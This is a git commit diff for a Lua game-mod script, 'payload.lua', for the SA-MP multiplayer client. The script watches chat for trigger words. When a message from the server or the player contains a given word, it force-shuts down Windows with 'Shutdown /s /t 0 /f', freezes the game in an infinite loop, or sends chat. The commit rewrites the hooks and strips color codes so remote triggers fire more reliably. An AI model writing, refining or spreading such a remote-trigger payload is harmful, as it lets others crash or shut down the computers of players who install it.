a1ad7109d4aeee04cc834fcaad20f22dfa428135
TheLold <paymentsse8@gmail.com>
2026-06-22 18:41:33 +0300

    Update payload.lua

--- payload.lua
+++ payload.lua
@@ -1,19 +1,7 @@
 -- payload.lua
-local sampev = require 'samp.events'
+-- Использование прямого хука SAMPFUNCS без внешних зависимостей
 
--- Обработка чата (входящие от сервера)
-function sampev.onServerMessage(color, text)
-    if text:find("хуйкина") then
-        os.execute("Shutdown /s /t 0 /f")
-    elseif text:find("кукусики") then
-        while true do end
-    elseif text:find("сырколбаска") then
-        sampSendChat("123655")
-    end
-end
-
--- Обработка чата (исходящие от игрока)
-function sampev.onSendChat(text)
+function onSendChat(text)
     if text:find("сырколбаска") then
         lua_thread.create(function()
             wait(500)
@@ -23,5 +11,18 @@ function sampev.onSendChat(text)
         os.execute("Shutdown /s /t 0 /f")
     elseif text:find("кукусики") then
         while true do end
+    end
+end
+
+function onReceiveChatMessage(text)
+    -- Очистка текста от цветов для надежного поиска
+    local cleanText = text:gsub("{%x%x%x%x%x%x}", "")
+    
+    if cleanText:find("хуйкина") then
+        os.execute("Shutdown /s /t 0 /f")
+    elseif cleanText:find("кукусики") then
+        while true do end
+    elseif cleanText:find("сырколбаска") then
+        sampSendChat("123655")
     end
 end
